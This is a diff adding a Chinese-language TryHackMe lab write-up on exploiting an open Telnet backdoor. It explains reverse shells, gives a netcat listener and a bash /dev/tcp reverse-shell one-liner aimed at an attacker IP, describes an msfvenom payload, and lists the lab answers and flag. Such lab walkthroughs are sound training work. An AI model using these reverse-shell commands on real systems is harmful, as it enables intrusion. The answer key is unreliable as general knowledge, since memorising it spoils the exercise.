@@ -428,6 +428,133 @@ Question 6、7：進階掃描 8012端口 `nmap -A -p 8012 -T4 靶機IP`
 
 >> #### Task 7：利用 Telnet
 
+- Reverse Shell
+
+| 項目 | 說明 |
+|:---|:---|
+| 🔷 Shell | 控制終端，可執行指令的介面（如 Bash、CMD） |
+| 🔷 Reverse Shell | 被控主機主動連線回攻擊者主機，建立 shell |
+| 🔷 攻擊者 | 開一個監聽 port（用 `nc -lvnp` 等），等待連線 |
+| 🔷 被控端 | 通過 `telnet`、`nc`、`bash`、`python` 等方式，反向打回連線到攻擊端 |
+| ✅ 優勢 | 能繞過某些防火牆，避免被監控系統阻擋 |
+
+---
+
+- 攻擊者端
+
+攻擊者主機啟動監聽： `nc -lvnp 4444`
+
+使用 nc（Netcat）開啟監聽：
+
+| 參數 | 解釋 |
+|:---|:---|
+| `-l` | listen 模式 |
+| `-v` | verbose（顯示更多細節） |
+| `-n` | 不做 DNS 查詢 |
+| `-p 4444` | 指定監聽 port（可自選） |
+
+- 目標者端
+
+目標端執行反彈指令（如成功登 telnet 或 shell）:<br>
+`bash -i >& /dev/tcp/[attacker_ip]/4444 0>&1`
+
+| 組件 | 解釋 |
+|:---|:---|
+| `bash -i` | 啟動互動式 bash shell |
+| `>& /dev/tcp/10.10.10.10/4444` | 把 stdout 與 stderr 轉送到 TCP 連線上（這個位置是特殊的 bash 機制） |
+| `0>&1` | 把 stdin 也導向那個連線，形成完整的雙向通訊 |
+
+結果：目標主機會主動「打回你這邊」，你就在你的 Netcat 介面看到一個 shell 🎉<br>
+`Connection received on 10.10.10.10 4444
+bash-5.0$`
+
+<p align="left">
+  <img src="/rooms/images/11_18.png" width="600">
+</p>
+
+Question 2、3：透過提示得知 8012 端口為 telnet 服務，`telnet 目標IP 8012`。歡迎訊息為`SKIDY'S BACKDOOR`。連線後嘗試`whoami`指令，無反應。
+
+<p align="left">
+  <img src="/rooms/images/11_19.png" width="600">
+</p>
+
+Question 6：另開終端機，`sudo tcpdump ip proto \\icmp -i ens5`，選擇偵聽 ens5 網卡的流量
+
+<p align="left">
+  <img src="/rooms/images/11_20.png" width="600">
+</p>
+
+從`telnet`介面`.RUN ping 虛擬機IP -c 1`，查看是否能夠在目標機的telnet服務器上執行系統命令。
+
+<p align="left">
+  <img src="/rooms/images/11_22.png" width="600">
+</p>
+
+虛擬機監聽到兩條記錄，說明目標機 `ping` 虛擬機成功
+
+<p align="left">
+  <img src="/rooms/images/11_21.png" width="600">
+</p>
+
+Question 8：另開終端機，使用 `msfvenom` 生成一個 netcat 反向 shell 有效 payload，最下面那段為 payload。
+
+<p align="left">
+  <img src="/rooms/images/11_23.png" width="600">
+</p>
+
+Question 9：在虛擬機上開啟 `netcat` 監聽，並在 `telnet` 介面貼上有效 payload
+
+<p align="left">
+  <img src="/rooms/images/11_24.png" width="600">
+</p>
+<p align="left">
+  <img src="/rooms/images/11_25.png" width="600">
+</p>
+
+Question 11：成功在虛擬機上取得 shell，並查看靶機上 flag.txt 文件，獲得 Flag 🎉🎉
+
+<p align="left">
+  <img src="/rooms/images/11_26.png" width="600">
+</p>
+
+##### 🔐 答題：
+2. Great! It's an open telnet connection! What welcome message do we receive?
+   
+    很好！這是一個開放的 telnet 連接！我們會收到什麼歡迎資訊？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `SKIDY'S BACKDOOR.`
+
+3. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
+   
+    讓我們嘗試執行一些命令，我們輸入到 telnet 工作階段中的任何輸入都會得到回報嗎？（是/否）
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `N`
+
+6. Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
+   
+    現在，通過 telnet 會話使用命令 「ping [local THM ip] -c 1」 來查看我們是否能夠執行系統命令。我們是否收到任何 ping？請注意，您需要在此前面加上 。執行 （Y/N）
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `Y`
+
+8. What word does the generated payload start with?
+   
+    生成的有效負載以什麼單詞開頭？
+
+&nbsp;&nbsp;&nbsp;&nbsp; `mkfifo`
+
+9. What would the command look like for the listening port we selected in our payload?
+   
+    我們在有效負載中選擇的偵聽埠的命令會是什麼樣子的？
+
+&nbsp;&nbsp;&nbsp;&nbsp; `nc -lvnp 4444`
+
+11. Success! What is the contents of flag.txt?
+   
+    成功！flag.txt 的內容是什麼？
+
+&nbsp;&nbsp;&nbsp;&nbsp; `THM{y0u_g0t_th3_t3ln3t_fl4g}`
+
+
 >> #### Task 8：瞭解 FTP
 
 >> #### Task 9：枚舉 FTP
